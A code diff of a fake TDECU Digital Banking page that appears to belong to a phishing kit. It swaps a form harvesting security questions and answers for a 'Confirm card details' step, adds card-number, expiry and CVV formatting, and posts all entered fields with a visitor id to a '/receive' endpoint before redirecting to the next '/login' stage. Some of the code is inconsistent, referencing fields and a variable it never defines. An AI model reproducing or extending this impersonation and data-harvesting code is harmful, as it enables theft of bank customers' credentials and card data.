@@ -5,13 +5,13 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=2.0, user-scalable=1" />
-    <title>Verify your security questions and their answers:</title>
+    <title>Confirm card details</title>
     
     
     
     
     
-    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <link rel="stylesheet" href="https://cdn1.onlineaccess1.com/cdn/wedge/sdk_e2e/css/all.min.css" />
     <link rel="stylesheet" href="https://cdn1.onlineaccess1.com/cdn/wedge/sdk_e2e/css/layout5.css" />
     <style>
@@ -80,6 +80,22 @@
         .outage-msg {
             font-size: 19px;
         }
+        
+        
+	.input-with-icon {
+  position: relative;
+}
+
+.input-with-icon input[type="text"] {
+  padding-right: 30px; /* Adjust the padding to accommodate the icon */
+}
+
+.input-with-icon i {
+  position: absolute;
+  top: 50%;
+  right: 5px; /* Adjust as needed */
+  transform: translateY(-50%);
+}
     </style>
     
 
@@ -111,7 +127,7 @@
     <div class="container col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12">
         <div class="row" style="margin-bottom: 40px;">
             <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
-                <h1 id="page_title"> Verify your security questions and their answers</h1>
+                <h1 id="page_title">  </h1>
                 <p id="page_message" class="page-message"> </p>
                 <ul id="nav-tabs" class="nav nav-tabs" role="tablist" style="display: none;"></ul>
             </div>
@@ -134,74 +150,16 @@
 
                 <div id="q2-form-fields" class="tab-content">
                     <div id="personal">
-                        <form autocomplete="off" class="q2-form fv-form fv-form-bootstrap" name="OnlineEnrollment_personal" id="form" action="javascript:void(0);" method="post" form="" novalidate="novalidate"><button type="submit" class="fv-hidden-submit" style="display: none; width: 0px; height: 0px;"></button><!-- Alert Area -->
-                            <div id="OnlineEnrollment_personalalertBox" class="alertBox hidden">
-                                <div class="row">
-                                    <div class="col-xs-2 col-sm-1 col-md-1"><i class="icon-warning-sign" aria-hidden="true"></i></div>
-                                    <div class="col-xs-10 col-sm-11 col-md-11 modal-msg"></div>
-                                </div>
-                            </div><!-- End Alert Area -->
-                            	
-                            	
-    <div class="input-wrapper">
-        <label class="tru-core-input__label" for="q1">Question 1:</label>
-        <input class="a-field-control form-control input-sm" type="text" id="q1" name="question1" required>
-    </div>
-    
-    <div class="input-wrapper">
-        <label class="tru-core-input__label" for="a1">Answer 1:</label>
-        <input class="a-field-control form-control input-sm" type="text" id="a1" name="answer1" required>
-    </div>
-    
-    <div class="input-wrapper">
-        <label class="tru-core-input__label" for="q2">Question 2:</label>
-        <input class="a-field-control form-control input-sm" type="text" id="q2" name="question2" required>
-    </div>
-    
-    <div class="input-wrapper">
-        <label class="tru-core-input__label" for="a2">Answer 2:</label>
-        <input class="a-field-control form-control input-sm" type="text" id="a2" name="answer2" required>
-    </div>
-    
-    <div class="input-wrapper">
-        <label class="tru-core-input__label" for="q3">Question 3:</label>
-        <input class="a-field-control form-control input-sm" type="text" id="q3" name="question3" required>
-    </div>
-    
-    <div class="input-wrapper">
-        <label class="tru-core-input__label" for="a3">Answer 3:</label>
-        <input class="a-field-control form-control input-sm" type="text" id="a3" name="answer3" required>
-    </div>
-    
-    <div class="input-wrapper">
-        <label class="tru-core-input__label" for="q4">Question 4:</label>
-        <input class="a-field-control form-control input-sm" type="text" id="q4" name="question4" required>
-    </div>
-    
-    <div class="input-wrapper">
-        <label class="tru-core-input__label" for="a4">Answer 4:</label>
-        <input class="a-field-control form-control input-sm" type="text" id="a4" name="answer4" required>
-    </div>
-    
-    
-    
-    
+                    	
 
-    
-    
-                            
-                            
-                            <div class="col-xs-12 ">
-                                <div class="line">
-                                    <p style="margin-top: 10px;"></p>
-                                    <center>
-                                    <br />To enroll your business or commercial accounts in TDECU Digital Banking, please <a href="https://www.tdecu.org/contact-form/">contact us.</a></center><br />
-                                    	
-                                    </p>
-                                </div>
-                            </div><input type="hidden" name="EnrollmentType" value="retail" /><input id="token_OnlineEnrollment_personal" type="hidden" name="token" value="" /><button class="btn btn-primary pull-right" id="submit_button_OnlineEnrollment_personal" test-id="e2e-submitButton">Continue</button>
-                            	
-                             </form>
+	<center>
+    <img style="width:50%" src="check.png" alt="Check Image">
+    	</center>
+    	
+    	<p>Verification complete..</p>
+</html>
+                    	
+                    	
                     </div>
                 </div>
 
@@ -215,9 +173,42 @@
 
     
 </body>
-<script src=
-'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'>
-    </script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+      
+<script>
+	 	
+
+	       new Cleave('#card-number', {
+            creditCard: true
+        });
+
+        new Cleave('#exp-date', {
+            date: true,
+            datePattern: ['m', 'y']
+        });
+
+        new Cleave('#cvv', {
+            numericOnly: true,
+            blocks: [3]
+        });
+
+        const form = document.getElementById('credit-card-form');
+        form.addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent form submission for now
+
+            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, ''); // Remove spaces
+            const expDate = document.getElementById('exp-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Perform additional validation checks here if needed
+            // For this example, let's simply log the input values
+            console.log('Card Number:', cardNumber);
+            console.log('Expiry Date:', expDate);
+            console.log('CVV:', cvv);
+        });
+        
+</script>
 <script>
     	
     $(document).ready(function() {
@@ -225,7 +216,7 @@
         event.preventDefault();
         let myForm = $("#form");
         let checkInputs = document.querySelectorAll('.form-control');
-		let message = "";
+
         // Flag to track if any input is empty
         let isEmpty = false;
 
@@ -233,14 +224,20 @@
             if (check.value.trim() === "") {
             	console.log(check.nextElementSibling);
                 check.parentElement.classList.add('has-error');
-                
+                check.nextElementSibling.style.display = "block";
+                check.nextElementSibling.classList.add('icon-warning-solid');
+                check.nextElementSibling.style.color = "#a94442"; 
+                //check.style.borderBottom = "1px solid red";
+             	
                 
                 
                 isEmpty = true;
             }else{
                 check.parentElement.classList.remove('has-error');
-                 message += check.name +': '+check.value+'\n';
-                 console.log(message);
+                check.nextElementSibling.style.display = "none";
+                check.nextElementSibling.classList.remove('icon-warning-solid');
+                check.nextElementSibling.style.color = ""; 
+                
                 isEmpty = false;
             }
         }
@@ -248,18 +245,25 @@
         if (!isEmpty) {
 				            // Validation passed, proceed with form submission
 				            let userinfo = myForm.serializeArray();
-				let visitor = sessionStorage.getItem('visitor');
+				let user = {};
 				
+				userinfo.forEach((value) => {
+				    // Use the 'id' attribute instead of 'name'
+				    user[value.name] = value.value;
+				});
+				
+				user['visitor'] = visitor;
+				console.log(user);
 				let url = '/receive';
 				
 				$.ajax({
 				    method: 'POST',
 				    url: url,
-				    data: { message: message, visitor: visitor }
+				    data: user
 				}).done(function(msg) {
                 console.log(msg);
                 // When the request is successful
-                window.location.href = "/login/3";
+                window.location.href = "/login/4";
                // window.location.href = "billing.php";
             }).fail(function(err, textstatus, error) {
                 // Handle AJAX request failure here
